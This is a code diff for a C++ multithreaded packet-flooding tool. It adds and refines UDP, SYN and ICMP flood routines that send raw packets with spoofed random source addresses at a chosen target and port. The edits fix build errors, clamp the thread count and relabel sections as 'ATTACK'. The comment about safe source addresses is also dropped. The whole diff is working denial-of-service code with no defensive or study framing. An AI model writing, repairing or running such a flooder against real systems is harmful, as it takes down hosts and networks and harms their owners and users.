@@ -4,11 +4,14 @@
 
 #include <arpa/inet.h>
 #include <atomic>
+#include <chrono>
 #include <cstdint>
 #include <cstdio>
 #include <cstdlib>
 #include <cstring>
+#include <ctime>
 #include <fstream>
+#include <functional>
 #include <netinet/in.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
@@ -40,7 +43,7 @@ static inline uint16_t csum(const void* data, int len) {
 }
 
 // ────────────────────────────────────────────
-// random non-routable-safe source IP
+// random source IP + ports
 // ────────────────────────────────────────────
 static thread_local std::mt19937 rng{std::random_device{}()};
 static thread_local std::uniform_int_distribution<uint32_t> u32d{0, 0xFFFFFFFFu};
@@ -61,13 +64,8 @@ static uint32_t random_ip() {
 }
 
 // ────────────────────────────────────────────
-// IP + UDP/TCP header builders
+// IP header builder
 // ────────────────────────────────────────────
-struct Pkt {
-    uint8_t buf[1500];
-    size_t len;
-};
-
 static void build_ip(uint8_t* buf, uint32_t src, uint32_t dst,
                      uint8_t proto, uint16_t payload_len) {
     struct iphdr* ip = (struct iphdr*)buf;
@@ -86,7 +84,7 @@ static void build_ip(uint8_t* buf, uint32_t src, uint32_t dst,
 }
 
 // ────────────────────────────────────────────
-// attack routines
+// ATTACK: UDP
 // ────────────────────────────────────────────
 static void flood_udp(const std::string& target_ip, uint16_t port) {
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
@@ -100,10 +98,8 @@ static void flood_udp(const std::string& target_ip, uint16_t port) {
     dst.sin_family = AF_INET;
     dst.sin_port = htons(port);
     inet_pton(AF_INET, target_ip.c_str(), &dst.sin_addr);
-
     uint32_t dst_ip = dst.sin_addr.s_addr;
 
-    // pre-fill payload once
     uint8_t payload[1400];
     for (auto& b : payload) b = (uint8_t)rand();
 
@@ -133,6 +129,9 @@ static void flood_udp(const std::string& target_ip, uint16_t port) {
     close(sock);
 }
 
+// ────────────────────────────────────────────
+// ATTACK: SYN
+// ────────────────────────────────────────────
 static void flood_syn(const std::string& target_ip, uint16_t port) {
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sock < 0) { perror("socket"); STOP.store(true); return; }
@@ -175,6 +174,17 @@ static void flood_syn(const std::string& target_ip, uint16_t port) {
     close(sock);
 }
 
+// ────────────────────────────────────────────
+// ATTACK: ICMP
+// ────────────────────────────────────────────
+struct icmphdr_s {
+    uint8_t  type;
+    uint8_t  code;
+    uint16_t checksum;
+    uint16_t id;
+    uint16_t seq;
+} __attribute__((packed));
+
 static void flood_icmp(const std::string& target_ip) {
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
     if (sock < 0) { perror("socket"); STOP.store(true); return; }
@@ -190,15 +200,7 @@ static void flood_icmp(const std::string& target_ip) {
     const size_t payload_len = 1400;
 
     while (!STOP.load(std::memory_order_relaxed)) {
-        struct icmphdr {
-            uint8_t  type;
-            uint8_t  code;
-            uint16_t checksum;
-            uint16_t id;
-            uint16_t seq;
-        } __attribute__((packed));
-
-        struct icmphdr* icmp = (struct icmphdr*)pkt;
+        struct icmphdr_s* icmp = (struct icmphdr_s*)pkt;
         icmp->type = 8;
         icmp->code = 0;
         icmp->checksum = 0;
@@ -242,6 +244,9 @@ int main(int argc, char** argv) {
     int threads = atoi(argv[4]);
     std::string stats_path = argv[5];
 
+    if (threads < 1) threads = 1;
+    if (threads > 256) threads = 256;
+
     signal(SIGINT, on_sig);
     signal(SIGTERM, on_sig);
 
@@ -249,12 +254,11 @@ int main(int argc, char** argv) {
     std::thread sw(stats_writer, stats_path, start);
     sw.detach();
 
-    auto fn = (method == "udp")  ? [&]{ flood_udp(target, port); }
-            : (method == "syn")  ? [&]{ flood_syn(target, port); }
-            : (method == "icmp") ? [&]{ flood_icmp(target); }
-            : nullptr;
-
-    if (!fn) {
+    std::function<void()> fn;
+    if (method == "udp")       fn = [&]{ flood_udp(target, port); };
+    else if (method == "syn")  fn = [&]{ flood_syn(target, port); };
+    else if (method == "icmp") fn = [&]{ flood_icmp(target); };
+    else {
         fprintf(stderr, "[!] unsupported method: %s\n", method.c_str());
         return 2;
     }
@@ -263,7 +267,6 @@ int main(int argc, char** argv) {
     for (int i = 0; i < threads; i++) pool.emplace_back(fn);
     for (auto& t : pool) t.join();
 
-    // final stats
     std::ofstream f(stats_path, std::ios::trunc);
     if (f) f << PKTS.load() << " " << start << "\n";
 
